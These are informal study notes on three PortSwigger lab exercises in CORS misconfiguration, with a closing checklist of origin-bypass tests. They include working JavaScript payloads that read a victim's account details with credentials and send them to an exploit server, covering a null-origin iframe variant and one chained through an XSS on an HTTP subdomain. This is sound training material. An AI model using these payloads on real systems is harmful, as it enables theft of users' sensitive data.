What is CORS (cross-origin resource sharing)?
Cross-origin resource sharing (CORS) is a browser mechanism which enables controlled access to resources located outside of a given domain


first lab

1. first refresh the page that has the sensitive data
send the request you see Access-Control-Allow-Credentials in the response so you think of cors
you add Origin: https://example.com to the request, hit send you see it as `Access-Control-Allow-Credentials: https://example.com`  in the request (vulnerable)

go to exploit server and send this script so you get the data for another user 
```jsx
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','[YOUR-LAB-ID.web-security-academy.net/accountDetails](http://your-lab-id.web-security-academy.net/accountDetails)',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='/log?key='+this.responseText;
};

</script>
````
2. **Lab: CORS vulnerability with trusted null origin**
   
it trusts null origin how to discover it: add origin: null to the request and you will find it in the response too 
an additional thing i want to add sometimes cors can be found it for example the site should accept only https://normal.com it only checks the prefix or the suffix of the url so if you try 
https://attacker-normal.com or https://normal.com.attakcer.net and it accepts then it's vulnerable
for exploit for null origin put this template to send the senstive data to your exploit server** 
```jsx
`<html>
<body>
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://0a1e00b5035ded9781e2f70100a20067.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='[https://exploit-0aeb00bd0345ed288191f6d401580080.exploit-server.net//log?key='+encodeURIComponent(this.responseText)](https://exploit-0aeb00bd0345ed288191f6d401580080.exploit-server.net//log?key=%27+encodeURIComponent(this.responseText));
};
</script>"></iframe>
</body>
</html>`
```

**third lab**
1. okay in this lab i analyzed it found a page shows api key 
and i found a subdomain of the page that uses http protocol not https which makes it vuln for MITM attack and tls stripping so 
i got the api page refresh it on burp 
first i tried to test suffix and prefix of the cors url Validation found out that it just checks on the suffix of the url 
i tried 
https://trusted-subdomain.net-test.com (didn't accept) then tried 
https://test-trusted-subdomain.net (accepted)  -bonus vulnerability-
by the way even test if the cors accepts http protocol if it accepts it's vuln even the the website doesn't have any http subdomains
try 
http://trusted-subdomain.net if accepts it's a vuln duo to MITM attacks
-back to the lab-

inject product id with xss and its vuln now insert the cors exploit to it then send the link to the victim 
```jsx
<script>
document.location="http://stock.0a2100be03ef062e8222655f00840093.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a2100be03ef062e8222655f00840093.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a96006f03f706bc82ef64c50156004a.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
````
so summary
try

Origin: https://random.com

Origin: null

try suffix/ prefix (
https://trusted-subdomain.net-test.com
https://test-trusted-subdomain.net

try 
http istead of https
